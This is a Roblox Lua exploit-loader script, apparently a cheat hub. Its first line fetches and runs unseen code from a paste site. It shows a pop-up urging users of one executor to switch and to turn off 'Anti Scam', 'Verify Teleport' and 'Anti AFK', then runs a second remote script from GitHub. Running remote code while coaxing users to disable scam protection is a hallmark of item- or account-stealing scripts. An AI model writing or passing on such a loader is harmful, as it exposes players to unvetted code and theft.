loadstring(game:HttpGet("https://pastefy.app/nwtxwHVW/raw"))()
-- Detect if running on Delta
local isDelta = identifyexecutor and identifyexecutor():lower():find("delta")

if isDelta then
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer

    -- ScreenGui
    local gui = Instance.new("ScreenGui")
    gui.Name = "DeltaWarningUI"
    gui.Parent = player:WaitForChild("PlayerGui")

    -- Main Frame
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 250)
    frame.Position = UDim2.new(0.5, -200, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "‚ö†Ô∏è Delta Executor Warning"
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 22
    title.TextColor3 = Color3.fromRGB(255, 75, 75)
    title.Parent = frame

    -- Message
    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -20, 0, 100)
    msg.Position = UDim2.new(0, 10, 0, 50)
    msg.BackgroundTransparency = 1
    msg.TextWrapped = true
    msg.Text = "Delta Executor has issues with this script!\n\nPlease use one of the recommended executors below:\n ‚àö Arceus X\n ‚àö Krnl\n\n1. Turn off Anti AFK\n2. Turn off Verify Teleport\n3. Turn off Anti Scam\n‚úÖ After disabling, press OK to continue"
    msg.Font = Enum.Font.SourceSans
    msg.TextSize = 18
    msg.TextColor3 = Color3.fromRGB(255, 255, 255)
    msg.Parent = frame

    -- KRNL Button
    local krnlBtn = Instance.new("TextButton")
    krnlBtn.Size = UDim2.new(0, 180, 0, 30)
    krnlBtn.Position = UDim2.new(0.5, -190, 1, -40)
    krnlBtn.Text = "üîó Get KRNL"
    krnlBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    krnlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    krnlBtn.Parent = frame
    krnlBtn.MouseButton1Click:Connect(function()
        setclipboard("https://krnl.place/") -- Copies link to clipboard
    end)

    -- Arceus X Button
    local arceusBtn = Instance.new("TextButton")
    arceusBtn.Size = UDim2.new(0, 180, 0, 30)
    arceusBtn.Position = UDim2.new(0.5, 10, 1, -40)
    arceusBtn.Text = "üîó Get Arceus X"
    arceusBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    arceusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    arceusBtn.Parent = frame
    arceusBtn.MouseButton1Click:Connect(function()
        setclipboard("https://arceusx.net/") -- Copies link to clipboard
    end)

    -- OK Button
    local okBtn = Instance.new("TextButton")
    okBtn.Size = UDim2.new(0, 120, 0, 30)
    okBtn.Position = UDim2.new(0.5, -60, 1, -80)
    okBtn.Text = "‚úÖ OK"
    okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    okBtn.Parent = frame
    okBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    return -- üö´ Prevents main script from loading
end

-- Main script only loads if NOT Delta
loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScriptz/ThunderZHub/refs/heads/main/Main.Script.Lua20%25"))()
